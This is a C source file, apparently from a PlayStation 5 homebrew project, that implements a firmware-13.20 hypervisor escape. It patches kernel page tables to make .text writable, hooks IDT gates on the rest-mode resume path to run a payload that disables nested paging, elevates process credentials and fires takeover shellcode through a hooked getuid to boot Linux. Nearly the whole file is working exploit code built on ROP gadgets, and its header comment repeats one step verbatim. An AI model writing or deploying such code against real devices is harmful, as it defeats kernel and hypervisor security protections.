/*
 * hv_defeat_1320.c -- high-firmware (8.xx+) vector, 13.20 first.
 *
 * The 3.00-7.61 path (hv_defeat_0304/0506/0607) defeats the hypervisor with
 * flatz' ACPI-wakeup ROP chain. That trick does not apply on high firmware.
 * Instead, per Byepervisor-Reborn, we:
 *
 *   1. Escape the guest: make kernel .text writable and clear the XOTEXT bit
 *      so the text can be patched (Byepervisor PTE walkers, vendored).
 *   1. Escape the guest: make kernel .text writable and clear the XOTEXT bit
 *      so the text can be patched (Byepervisor PTE walkers, vendored).
 *   2. Install a kernel-cave IDT-gate hook ("khook") that fires on the S3
 *      resume path on KERNEL_SYM_HV_MP_STARTUP_CALL, redirecting its RSI to the
 *      break_hv payload, which disables NPT on every core and returns to the
 *      guest so the console resumes normally.
 *   3. Post-resume, from the BSP kernel context, patch the HV VMEXIT dispatcher
 *      and force every CPU to issue a raw VMMCALL via smp_rendezvous, landing
 *      in shellcode_hv (staged in the identity-mapped cave), which boots Linux
 *      bare-metal with full SMP.
 */

#include "config.h"
#include "hv_defeat_1320.h"
#include "linux.h"
#include "shellcode_hv.h"
#include "break_hv.h"
#include "takeover.h"
#include "utils.h"

#include <ps5/kernel.h>
#include <stddef.h>
#include <stdint.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>

#include "byepervisor/kdlsym.h"
#include "byepervisor/khook.h"
#include "byepervisor/paging.h"

#define STATE_ARMED 0x4B484F4F4B454401ULL // 'KHOOKED.'
#define COOKIE_VAL 0xCAFE133741414141ULL
#define HOOK_CORE 0
#define HOOK_IST 6
#define TSS_STRIDE 0x68
#define STARTUP_MP_PAYLOAD_PAGE 0x3FFFF000ULL

#define CAVE_STATE_OFF 0x600
#define CAVE_SAVE_OFF 0x620

/* Set by hv_defeat_1320() before rest mode, consumed by the post-resume
 * takeover. Break_hv writes its cookie to g_oracle when the resume payload
 * runs, which is how we detect that NPT is off and the AP is back in-guest. */
static uint64_t g_oracle;
static uint64_t g_payload_va;
static int g_armed;

/* khook wants int-returning read/write function pointers; the project helpers
 * are void, so wrap them. */
static int by_read(uint64_t kaddr, void *dst, size_t len) {
  kread(kaddr, dst, len);
  return 0;
}

static int by_write(uint64_t kaddr, const void *src, size_t len) {
  kwrite(kaddr, (void *)src, len);
  return 0;
}

/*
 * Fail fast (with a notification) if the fields this vector needs are not
 * populated for the running firmware. Fields used only by the (not yet wired)
 * Linux prep are intentionally excluded so the escape can run today.
 */
static int check_offsets(void) {
  const struct {
    const char *name;
    uint64_t value;
  } need[] = {
      {"HV_MP_STARTUP_CALL", env_offset.KERNEL_SYM_HV_MP_STARTUP_CALL},
      {"PMAP_STORE", env_offset.KERNEL_SYM_PMAP_STORE},
      {"DATA_CAVE", env_offset.KERNEL_SYM_DATA_CAVE},
      {"DMPML4I", env_offset.KERNEL_SYM_DMPML4I},
      {"DMPDPI", env_offset.KERNEL_SYM_DMPDPI},
      {"PML4PML4I", env_offset.KERNEL_SYM_PML4PML4I},
      {"IDT", env_offset.IDT},
      {"COMMON_TSS", env_offset.COMMON_TSS},
      {"HV_SYM_HEAP_BASE", env_offset.HV_SYM_HEAP_BASE},
      {"HV_SYM_PCPUS", env_offset.HV_SYM_PCPUS},
      {"HV_LOADER_PA_REGULAR", env_offset.HV_LOADER_PA_REGULAR},
      {"GAD_ADD_RSP_28_POP_RBP_RET", env_offset.GAD_ADD_RSP_28_POP_RBP_RET},
      {"GAD_IRETQ", env_offset.GAD_IRETQ},
      {"GAD_POP_RCX_RET", env_offset.GAD_POP_RCX_RET},
      {"GAD_POP_RDI_RET", env_offset.GAD_POP_RDI_RET},
      {"GAD_POP_RSI_RET", env_offset.GAD_POP_RSI_RET},
      {"GAD_POP_RDX_RET", env_offset.GAD_POP_RDX_RET},
      {"GAD_POP_RSP_RET", env_offset.GAD_POP_RSP_RET},
      {"GAD_POP_R8", env_offset.GAD_POP_R8},
      {"GAD_STORE_RCX_R8", env_offset.GAD_STORE_RCX_R8},
      {"GAD_STORE_RDI8_RCX", env_offset.GAD_STORE_RDI8_RCX},
      {"GAD_OR_RCX_EAX", env_offset.GAD_OR_RCX_EAX},
      {"GAD_SET_DR7", env_offset.GAD_SET_DR7},
      {"GAD_ST_RCX_RDX", env_offset.GAD_ST_RCX_RDX},
      {"GAD_ST_RCX_RAX", env_offset.GAD_ST_RCX_RAX},
      {"GAD_MOV_RAX_RSI", env_offset.GAD_MOV_RAX_RSI},
      {"GAD_MOV_RAX_RDI", env_offset.GAD_MOV_RAX_RDI},
      {"GAD_REP_MOVSB", env_offset.GAD_REP_MOVSB},
      {"GAD_CLD", env_offset.GAD_CLD},
      {"GAD_RET_TRAMP", env_offset.GAD_RET_TRAMP},
      {"GAD_DBREG_RESUME", env_offset.GAD_DBREG_RESUME},
  };

  for (size_t i = 0; i < sizeof(need) / sizeof(need[0]); i++) {
    if (!need[i].value) {
      notify("13.20: missing offset %s\n", need[i].name);
      return -1;
    }
  }
  return 0;
}

/* Make the kernel .text RW and clear XOTEXT so it can be patched. */
static void escape_kernel_text(uint64_t kernel_pmap) {
  uint64_t entry_addr, entry;

  for (uint64_t addr = ktext; addr < kdata; addr += 0x1000) {
    entry_addr = find_pde(kernel_pmap, addr, &entry);
    if (entry_addr != 0xFFFFFFFFFFFFFFFFull) {
      CLEAR_PDE_BIT(entry, XOTEXT);
      SET_PDE_BIT(entry, RW);
      kwrite64(entry_addr, entry);
    }

    entry_addr = find_pte(kernel_pmap, addr, &entry);
    if (entry_addr != 0xFFFFFFFFFFFFFFFFull) {
      CLEAR_PDE_BIT(entry, XOTEXT);
      SET_PDE_BIT(entry, RW);
      kwrite64(entry_addr, entry);
    }
  }
}

/* Make STARTUP_MP_PAYLOAD_PAGE executable in the guest page tables so the HV can
 * call into it after resume. */
static void map_payload_executable(uint64_t kernel_pmap) {
  uint64_t va = kdldmap(STARTUP_MP_PAYLOAD_PAGE);
  uint64_t entry_addr, entry;

  entry_addr = find_pml4e(kernel_pmap, va, &entry);
  if (entry_addr != 0xFFFFFFFFFFFFFFFFull) {
    CLEAR_PDE_BIT(entry, EXECUTE_DISABLE);
    kwrite64(entry_addr, entry);
  }

  entry_addr = find_pdpe(kernel_pmap, va, &entry);
  if (entry_addr != 0xFFFFFFFFFFFFFFFFull) {
    CLEAR_PDE_BIT(entry, EXECUTE_DISABLE);
    kwrite64(entry_addr, entry);
  }

  entry_addr = find_pde(kernel_pmap, va, &entry);
  if (entry_addr != 0xFFFFFFFFFFFFFFFFull) {
    CLEAR_PDE_BIT(entry, EXECUTE_DISABLE);
    kwrite64(entry_addr, entry);

    if (PDE_FIELD(entry, PS) != 1) {
      entry_addr = find_pte(kernel_pmap, va, &entry);
      if (entry_addr != 0xFFFFFFFFFFFFFFFFull) {
        CLEAR_PDE_BIT(entry, EXECUTE_DISABLE);
        kwrite64(entry_addr, entry);
      }
    }
  }
}

/* HV loader carveout base. Retail/"regular" SoC only: sceKernelGetMainSocId() is
 * not resolvable by elfldr on retail (undefined import), so we cannot probe the
 * SoC id at runtime. The Pro variant (HV_LOADER_PA_PRO) is not handled here. */
static uint64_t hv_base_pa(void) {
  return env_offset.HV_LOADER_PA_REGULAR;
}

/*
 * Stage everything shellcode_hv needs into the identity-mapped cave before we
 * enter rest mode. shellcode_hv runs with the identity CR3, so everything it
 * reads must live in the cave (4 GiB physical, mapped by the 5 GiB identity
 * table) and be addressed by physical address:
 *
 *   cave_hv_paging  : PML4 + PDPT covering 0..5 GiB (identity)
 *   cave_hv_code    : the shellcode_hv blob
 *   cave_linux_info : struct linux_info (bzimage/initrd now cave PAs)
 *   cave_bzImage    : bzImage, followed by the initrd
 *
 * All of this is written through the kernel direct map before entering rest
 * mode, so it is already in place when the resume payload jumps to shellcode_hv.
 */
static void stage_identity_map(void) {
  uint64_t identity_pml4_0 = cave_hv_paging + 0x1003ULL;
  uint64_t l3[] = {
      0x0000000000000083, // 0-1 GiB
      0x0000000040000083, // 1-2 GiB
      0x0000000080000083, // 2-3 GiB
      0x00000000C0000083, // 3-4 GiB
      0x0000000100000083  // 4-5 GiB (cave + shellcode_hv)
  };

  kwrite64(pa_to_dmap(cave_hv_paging), identity_pml4_0);
  for (size_t i = 0; i < sizeof(l3) / sizeof(l3[0]); i++)
    kwrite64(pa_to_dmap(PAGE_PA(identity_pml4_0) + i * 8), l3[i]);

  /* The payload executes at a *high* direct-map VA (kdldmap of the payload
   * page), so after `mov cr3` the very next instruction would fault unless the
   * identity table also maps that VA. Alias the payload's 1 GiB region to the
   * matching physical range with a single 1 GiB page in a second PDPT. */
  uint64_t dmap_base = kdldmap(0);
  uint64_t payload_va = kdldmap(STARTUP_MP_PAYLOAD_PAGE);
  uint32_t pm4idx = (payload_va >> 39) & 0x1FF;
  uint32_t pdpi = (payload_va >> 30) & 0x1FF;
  uint64_t high_pdpt_pa = cave_hv_paging + 0x2000ULL;
  uint64_t high_entry =
      ((payload_va - dmap_base) & ~0x3FFFFFFFULL) | 0x83ULL;

  if (pm4idx != 0) {
    kwrite64(pa_to_dmap(cave_hv_paging + (uint64_t)pm4idx * 8),
             high_pdpt_pa | 0x3ULL);
    kwrite64(pa_to_dmap(high_pdpt_pa + (uint64_t)pdpi * 8), high_entry);
  }
}

static int stage_hv_boot(void) {
  if (!linux_bzimage_user || !linux_initrd_user) {
    notify("13.20: Linux images missing, cannot stage HV boot.\n");
    return -1;
  }

  /* Identity map + the shellcode_hv blob it will jump into. */
  stage_identity_map();
  kwrite(pa_to_dmap(cave_hv_code), shellcode_hv_bin, shellcode_hv_bin_len);

  /* Build the linux_info the HV shellcode reads from cave_linux_info, with the
   * kernel/initrd relocated to identity-mapped physical addresses. */
  struct linux_info info = linux_i;
  info.linux_info = cave_linux_info;
  info.bzimage = cave_bzImage;
  info.bzimage_size = linux_bzimage_len;
  info.initrd = cave_bzImage + ALIGN_UP(linux_bzimage_len, PAGE_SIZE);
  info.initrd_size = linux_initrd_len;
  info.n_tmrs = 0;

#if HV_HEADLESS_SINGLE_CORE
  /* The khook payload only runs on one core; tell Linux not to try to bring up
   * the APs (which are still parked in the hypervisor). */
  if (strlen(info.cmdline) + sizeof(" maxcpus=1 nosmp") <=
      sizeof(info.cmdline))
    strcat(info.cmdline, " maxcpus=1 nosmp");
#endif

  kwrite(pa_to_dmap(cave_linux_info), &info, sizeof(struct linux_info));
  kwrite_large(pa_to_dmap(info.bzimage), linux_bzimage_user, info.bzimage_size);
  kwrite_large(pa_to_dmap(info.initrd), linux_initrd_user, info.initrd_size);

  notify("13.20: staged shellcode_hv (%u B) + Linux @ %#lx/%#lx.\n",
         shellcode_hv_bin_len, (unsigned long)info.bzimage,
         (unsigned long)info.initrd);
  return 0;
}

/*
 * Stage the break_hv payload + its Byepervisor param block at
 * STARTUP_MP_PAYLOAD_PAGE, then install the resume khook so that the HV's
 * startup_mp call gets its RSI redirected to the payload. break_hv disables
 * NPT on every core and jumps back to the guest init vector, so the console
 * resumes normally and we can run the takeover from the BSP afterwards.
 *
 * Param layout (matches break_hv's entry.S / Byepervisor):
 *   [0]=init_cb  [1]=dmap  [2]=cookie addr  [3]=carveout  [4]=heap  [5]=pcpus
 */
static int install_resume_hook(uint64_t cave_addr) {
  khook_t hook;
  kh_chain_t chain;
  uint8_t chain_buf[0x100];
  uint64_t scratch = kdlsym(KERNEL_SYM_DATA_CAVE);
  uint64_t oracle = scratch + KH_OFF_USER;
  uint64_t payload_va = kdldmap(STARTUP_MP_PAYLOAD_PAGE);
  uint64_t params_va = payload_va + 0xF00;
  uint64_t hv_base = hv_base_pa();
  int ret;

  kwrite(payload_va, break_hv_bin, break_hv_bin_len);
  notify("13.20: [A] payload staged, hv_base=%#lx\n", (unsigned long)hv_base);

  kwrite64(params_va + 0x00, kdlsym(KERNEL_SYM_MP_STARTUP_INIT_VECTOR));
  kwrite64(params_va + 0x08, kdldmap(0)); /* dmap */
  kwrite64(params_va + 0x10, oracle);     /* cookie addr (break_hv writes it) */
  kwrite64(params_va + 0x18, hv_base);    /* carveout */
  kwrite64(params_va + 0x20, hv_base + env_offset.HV_SYM_HEAP_BASE);
  kwrite64(params_va + 0x28, hv_base + env_offset.HV_SYM_PCPUS);
  notify("13.20: [B] params staged\n");

  kwrite64(oracle, 0);

  ret = kh_init(&hook, by_read, by_write, ktext, scratch, HOOK_IST);
  notify("13.20: [C] kh_init rc=%d\n", ret);
  if (ret)
    return ret;

  hook.tss_stride = TSS_STRIDE;
  kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY),
                kdlsym(KERNEL_SYM_COMMON_TSS));
  kh_set_core(&hook, HOOK_CORE);
  hook.oneshot = 1;

  kh_set_hook_target(&hook, kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL));
  kh_set_resume_rsi(&hook, payload_va);

  /* No chain: the payload only needs the redirected RSI. It writes the cookie
   * itself, which the post-resume phase polls. */
  kh_chain_init(&chain, chain_buf, sizeof chain_buf);

  ret = kh_install(&hook, &chain);
  notify("13.20: [D] kh_install rc=%d\n", ret);
  if (ret)
    return ret;

  notify("13.20: [E] triggering...\n");
  kh_trigger(&hook);
  notify("13.20: [F] triggered\n");

  g_oracle = oracle;
  g_payload_va = payload_va;
  g_armed = 1;

  kwrite64(cave_addr + CAVE_STATE_OFF, STATE_ARMED);
  kwrite64(cave_addr + CAVE_SAVE_OFF + 0x00, hook.saved_gate_lo);
  kwrite64(cave_addr + CAVE_SAVE_OFF + 0x08, hook.saved_gate_hi);
  kwrite64(cave_addr + CAVE_SAVE_OFF + 0x10, hook.saved_ist);

  return 0;
}

/*
 * Post-resume: wait for break_hv's cookie, then take over the HV from the BSP
 * kernel context. We install a second khook on SYS_GETUID that redirects the
 * syscall's resume RIP to the takeover blob (staged at g_payload_va). The blob
 * patches the HV VMEXIT dispatcher and drives smp_rendezvous so every CPU
 * VMMCALLs into shellcode_hv. Nothing returns.
 */
int hv_defeat_1320_post_resume(void) {
  khook_t hook;
  kh_chain_t chain;
  uint8_t chain_buf[0x100];
  uint64_t cookie = 0;
  int ret;

  if (!g_armed) {
    notify("13.20: post-resume called but vector was never armed.\n");
    return -1;
  }

  /* The resume payload may take a moment (and the process is frozen while the
   * console is actually asleep). Poll until break_hv stamps the cookie. */
  for (int i = 0; i < 300 && cookie == 0; i++) {
    cookie = kread64(g_oracle);
    if (cookie == 0)
      sleep(2);
  }
  if (cookie == 0) {
    notify("13.20: resume payload never ran (no cookie).\n");
    return -1;
  }
  notify("13.20: NPT disabled (cookie %#lx); launching takeover.\n", cookie);

  /* Credentials may not have survived the power cycle. */
  kernel_set_ucred_authid(getpid(), 0x4800000000000007);
  pin_to_core(HOOK_CORE);

  /* Refresh the cave stages: the suspend/resume cycle may have reused the
   * physical pages holding the identity table and the Linux images. */
  if (stage_hv_boot())
    return -1;

  kwrite(g_payload_va, takeover_bin, takeover_bin_len);

  ret = kh_init(&hook, by_read, by_write, ktext, kdlsym(KERNEL_SYM_DATA_CAVE),
                HOOK_IST);
  if (ret) {
    notify("13.20: takeover kh_init failed (%d).\n", ret);
    return ret;
  }

  hook.tss_stride = TSS_STRIDE;
  kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY),
                kdlsym(KERNEL_SYM_COMMON_TSS));
  kh_set_core(&hook, HOOK_CORE);
  hook.oneshot = 1;

  kh_set_hook_target(&hook, kdlsym(KERNEL_SYM_SYS_GETUID) + 0xE);
  kh_set_resume_rip(&hook, g_payload_va);
  kh_set_resume_rdi(&hook, ktext);      /* takeover blob arg0 = ktext */
  kh_set_resume_rsi(&hook, kdldmap(0)); /* takeover blob arg1 = dmap  */

  kh_chain_init(&chain, chain_buf, sizeof chain_buf);

  ret = kh_install(&hook, &chain);
  if (ret) {
    notify("13.20: takeover hook install failed (%d).\n", ret);
    return ret;
  }

  kh_trigger(&hook);

  notify("13.20: takeover armed; firing getuid() -> shellcode_hv.\n");
  syscall(SYS_getuid);

  notify("13.20: getuid() returned; takeover did not fire.\n");
  return -1;
}

int hv_defeat_1320(void *shellcode_kernel, size_t shellcode_kernel_len) {
  uint64_t cave_addr;
  uint64_t kernel_pmap;
  int ret;

  if (shellcode_kernel == NULL || shellcode_kernel_len == 0) {
    notify("13.20: shellcode_kernel was not prepared\n");
    return -1;
  }

  if (check_offsets()) {
    notify("13.20: high-FW vector is not ready (offsets incomplete).\n");
    return -1;
  }

  /* Kernel memory R/W without tripping the guest permission checks. */
  kernel_set_ucred_authid(getpid(), 0x4800000000000007);
  pin_to_core(HOOK_CORE);

  cave_addr = kdlsym(KERNEL_SYM_DATA_CAVE);
  kernel_pmap = kdlsym(KERNEL_SYM_PMAP_STORE);

  if (kread64(cave_addr + CAVE_STATE_OFF) == STATE_ARMED) {
    notify("13.20: hook already armed (state survived).\n");
    return 0;
  }

  notify("13.20: escaping hypervisor (Byepervisor khook)...\n");

  escape_kernel_text(kernel_pmap);
  map_payload_executable(kernel_pmap);

  if (stage_hv_boot())
    return -1;

  ret = install_resume_hook(cave_addr);
  if (ret) {
    notify("13.20: hook install failed (khook rc=%d).\n", ret);
    return -1;
  }

  notify("13.20: hypervisor escape armed. Rest mode -> payload.\n");
  return 0;
}
